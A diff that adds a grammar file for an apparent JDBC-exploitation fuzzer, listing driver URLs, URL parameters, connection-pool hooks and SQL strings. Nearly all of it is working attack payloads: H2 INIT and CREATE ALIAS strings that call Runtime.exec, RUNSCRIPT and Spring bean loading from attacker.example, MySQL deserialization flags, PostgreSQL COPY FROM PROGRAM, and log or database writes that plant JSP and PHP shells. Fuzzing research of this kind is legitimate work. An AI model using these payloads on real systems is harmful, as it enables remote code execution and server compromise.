@@ -1,0 +1,154 @@
+# =============================================================================
+# JDBC Connection Attack Grammar — IR (Intermediate Representation)
+# Generates JSON IR for JDBC connection-level exploitation.
+#
+# Complements the JNDI ObjectFactory fuzzer by directly exercising
+# DriverManager.getConnection() and connection pool lifecycle hooks,
+# bypassing the JNDI layer entirely.
+#
+# Taxonomy axes:
+#   J1  Driver selection           → H2, HSQLDB, MySQL, PostgreSQL, Derby, etc.
+#   J2  URL parameter injection    → INIT, autoDeserialize, socketFactory
+#   J3  Pool lifecycle hooks       → initSQL, validationQuery, connectionInitSql
+#   J4  SQL payload execution      → CREATE ALIAS, CALL, COPY FROM PROGRAM
+#   J5  Authentication bypass      → null/empty password, proxy user
+#   J6  Deserialization properties → autoDeserialize, userOverridesAsString
+# =============================================================================
+
+!root <ir>
+!max_depth 4
+
+# Full IR object
+<ir> = {"attack_type":"jdbc_exploit","driver":<driver>,"driver_class":<driver_class>,"jdbc_url_base":<jdbc_url_base>,"url_params":<url_params>,"pool":<pool>,"pool_config":<pool_config>,"credentials":<credentials>,"sql_payload":<sql_payload>,"sink_type":<sink_type>,"deser_properties":<deser_properties>}
+
+# ── Driver short names ───────────────────────────────────────
+<driver> = "h2"
+<driver> = "hsqldb"
+<driver> = "mysql"
+<driver> = "postgresql"
+<driver> = "derby"
+<driver> = "mariadb"
+<driver> = "sqlite"
+<driver> = "oracle"
+<driver> = "sqlserver"
+
+# ── Driver classes ───────────────────────────────────────────
+<driver_class> = "org.h2.Driver"
+<driver_class> = "org.hsqldb.jdbc.JDBCDriver"
+<driver_class> = "com.mysql.cj.jdbc.Driver"
+<driver_class> = "com.mysql.jdbc.Driver"
+<driver_class> = "org.postgresql.Driver"
+<driver_class> = "org.apache.derby.jdbc.EmbeddedDriver"
+<driver_class> = "org.mariadb.jdbc.Driver"
+<driver_class> = "org.sqlite.JDBC"
+<driver_class> = "oracle.jdbc.OracleDriver"
+<driver_class> = "com.microsoft.sqlserver.jdbc.SQLServerDriver"
+
+# ── JDBC URL bases ───────────────────────────────────────────
+# H2
+<jdbc_url_base> = "jdbc:h2:mem:test"
+<jdbc_url_base> = "jdbc:h2:file:/tmp/testdb"
+<jdbc_url_base> = "jdbc:h2:tcp://localhost/test"
+# HSQLDB
+<jdbc_url_base> = "jdbc:hsqldb:mem:test"
+<jdbc_url_base> = "jdbc:hsqldb:file:/tmp/testdb"
+<jdbc_url_base> = "jdbc:hsqldb:http://attacker.example/db"
+# MySQL
+<jdbc_url_base> = "jdbc:mysql://attacker.example/test"
+<jdbc_url_base> = "jdbc:mysql://localhost/test"
+# PostgreSQL
+<jdbc_url_base> = "jdbc:postgresql://attacker.example/test"
+<jdbc_url_base> = "jdbc:postgresql://localhost/test"
+# Derby
+<jdbc_url_base> = "jdbc:derby:memory:test;create=true"
+# MariaDB
+<jdbc_url_base> = "jdbc:mariadb://attacker.example/test"
+# SQLite
+<jdbc_url_base> = "jdbc:sqlite::memory:"
+<jdbc_url_base> = "jdbc:sqlite:/tmp/test.db"
+
+# ── URL parameters (driver-specific) ────────────────────────
+# H2 INIT RCE
+<url_params> = {"INIT":"RUNSCRIPT FROM 'http://attacker.example/evil.sql'"}
+<url_params> = {"INIT":"CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')"}
+<url_params> = {"TRACE_LEVEL_SYSTEM_OUT":"3","TRACE_LEVEL_FILE":"3"}
+<url_params> = {"INIT":"CREATE ALIAS SHELLEXEC AS $$ void e(String c) throws Exception {Runtime.getRuntime().exec(c);} $$;CALL SHELLEXEC('id')"}
+# MySQL deserialization
+<url_params> = {"autoDeserialize":"true","queryInterceptors":"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"}
+<url_params> = {"allowLoadLocalInfile":"true"}
+<url_params> = {"allowUrlInLocalInfile":"true","allowLoadLocalInfile":"true"}
+<url_params> = {"detectCustomCollations":"true"}
+# PostgreSQL class instantiation
+<url_params> = {"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext","socketFactoryArg":"http://attacker.example/bean.xml"}
+<url_params> = {"sslfactory":"org.springframework.context.support.ClassPathXmlApplicationContext","sslfactoryarg":"http://attacker.example/bean.xml"}
+<url_params> = {"loggerLevel":"DEBUG","loggerFile":"/tmp/pwned"}
+<url_params> = {"loggerLevel":"DEBUG","loggerFile":"../../webapps/ROOT/shell.jsp"}
+# SQLServer
+<url_params> = {"trustServerCertificate":"true","authenticationScheme":"NTLM"}
+# Empty (no params)
+<url_params> = {}
+
+# ── Connection pools ────────────────────────────────────────
+<pool> = "none"
+<pool> = "dbcp2"
+<pool> = "hikari"
+<pool> = "c3p0"
+<pool> = "druid"
+<pool> = "tomcat"
+
+# ── Pool configurations (lifecycle hooks) ────────────────────
+<pool_config> = {}
+# DBCP2
+<pool_config> = {"connectionInitSqls":"CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')","initialSize":"1"}
+<pool_config> = {"validationQuery":"CALL \"java.lang.Runtime\".exec('id')","testOnCreate":"true"}
+# HikariCP
+<pool_config> = {"connectionInitSql":"CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')"}
+<pool_config> = {"connectionTestQuery":"CALL \"java.lang.Runtime\".exec('id')"}
+# C3P0
+<pool_config> = {"preferredTestQuery":"CALL \"java.lang.Runtime\".exec('id')"}
+# Druid
+<pool_config> = {"init":"true","initConnectionSqls":"CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')"}
+<pool_config> = {"init":"true","validationQuery":"CALL \"java.lang.Runtime\".exec('id')","testOnReturn":"true"}
+# Tomcat JDBC
+<pool_config> = {"initSQL":"CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')","testOnConnect":"true"}
+
+# ── Credentials ──────────────────────────────────────────────
+<credentials> = {"user":"sa","password":""}
+<credentials> = {"user":"sa","password":"sa"}
+<credentials> = {"user":"","password":""}
+<credentials> = {"user":"root","password":""}
+<credentials> = {"user":"postgres","password":""}
+
+# ── SQL payloads (post-connection) ───────────────────────────
+<sql_payload> = null
+# H2 RCE
+<sql_payload> = "CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')"
+<sql_payload> = "RUNSCRIPT FROM 'http://attacker.example/evil.sql'"
+<sql_payload> = "CREATE LINKED TABLE EVIL('','jdbc:h2:mem:','sa','','DUAL')"
+# HSQLDB method invocation
+<sql_payload> = "CALL \"java.lang.Runtime\".exec('id')"
+<sql_payload> = "CALL \"java.lang.System\".setProperty('pwned','true')"
+# PostgreSQL
+<sql_payload> = "COPY cmd_exec FROM PROGRAM 'id'"
+# Derby
+<sql_payload> = "CALL SYSCS_UTIL.SYSCS_EXPORT_TABLE(null,'SYSSCHEMAS','/tmp/out.csv',null,null,null)"
+# SQLite
+<sql_payload> = "ATTACH DATABASE '/tmp/shell.php' AS shell"
+# Generic
+<sql_payload> = "SELECT 1"
+<sql_payload> = "SELECT CURRENT_USER"
+
+# ── Sink types ───────────────────────────────────────────────
+<sink_type> = "cmd_exec"
+<sink_type> = "sql_exec"
+<sink_type> = "file_write"
+<sink_type> = "file_read"
+<sink_type> = "network"
+<sink_type> = "deser"
+<sink_type> = "class_load"
+
+# ── Deserialization properties ───────────────────────────────
+<deser_properties> = {}
+<deser_properties> = {"autoDeserialize":"true"}
+<deser_properties> = {"socketFactory":"com.sun.rowset.JdbcRowSetImpl"}
+<deser_properties> = {"sslfactory":"org.springframework.context.support.ClassPathXmlApplicationContext"}
